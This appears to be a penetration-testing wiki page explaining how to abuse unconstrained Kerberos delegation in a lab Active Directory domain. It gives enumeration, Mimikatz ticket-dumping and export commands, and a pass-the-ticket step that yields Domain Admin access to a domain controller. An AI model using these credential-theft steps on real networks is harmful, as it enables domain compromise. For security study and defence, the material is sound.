# Unconstrained Delegation

## Description

Kerberos delegation in Active Directory is the ability for an object such as a user or computer to "re-use end user credentials" to access resources hosted on a different server. &#x20;

Unconstrained Delegation is where if we have a computer such as a File Server with the "Trust this computer for delegation to any service" option enabled and then a Domain Administrator logs into the File Server we can grab a copy of the Domain Administrators TGT and use this to authenticate **anywhere** in the Domain.

![](<.gitbook/assets/image (2044) (1).png>)

{% hint style="info" %}
Domain Controllers will always have TrustedForDelegation enabled.
{% endhint %}

## Enumeration

The PowerShell Active Directory Module can be used to search for objects with the `TrustedForDelegation` property set to True.

```
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
```

![](<.gitbook/assets/image (2040) (1) (1).png>)

Above we can see that the computer object FileSRV01.Security.local has the TrustedForDelegation property set to True.

Running Mimikatz on the File Server FileSRV01 shows we have no Ticket Granting Ticket (TGT) for the Domain Administrator account.

```bash
# Mimikatz
privilege::debug
sekurlsa::tickets
```

![](<.gitbook/assets/image (2042) (1) (1) (1).png>)

However, after applying the 'Trust this computer for delegation to any service' options in Active Directory we then access the file share on FileSRV01 as the Domain Administrator from a different device.

![](<.gitbook/assets/image (2038) (1) (1).png>)

After doing so we can run Mimikatz again and look at the stored Kerberos tickets. This time we see we have a stored ticket for the Domain Administrator

![](<.gitbook/assets/image (2037) (1).png>)

This ticket can be exported with Mimikatz and later, used to authenticate else where in the Domain.&#x20;

```
sekurlsa::tickets /export
```

![](<.gitbook/assets/Export Tickets.png>)

After exporting the ticket we can see a list of all Kerberos tickets in the current working directory.

![](<.gitbook/assets/List of tickets in CWD.png>)

Mimikatz can then be used to import one of the tickets and use Pass-The-Ticket to impersonate the selected ticket in the context of a process.

```
kerberos::ptt <PathToTicket>
```

![](<.gitbook/assets/Loaded Admin Ticket.png>)

With the ticket imported we are essentially now working as the Domain Admin. From here the command `misc::cmd` can be used to open a command prompt that can also use Domain Admin rights.

The first image below shows what happens when trying to list the contents of the C:\ drive of the Domain Controller DC01.Security.local without an imported Kerberos ticket.

![](<.gitbook/assets/Dir as non DA.png>)

Below shows the result of the same command used when the Domain Admin Kerberos ticket is imported and a command shell is opened with `misc::cmd`. As per below we are now able to list the contents of C:\ on DC01.Security.local.

![](<.gitbook/assets/DC dir.png>)

## References

{% embed url="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1" %}

{% embed url="https://stealthbits.com/blog/unconstrained-delegation-permissions" %}

{% embed url="https://docs.microsoft.com/en-us/archive/blogs/autz_auth_stuff/kerberos-delegation" %}
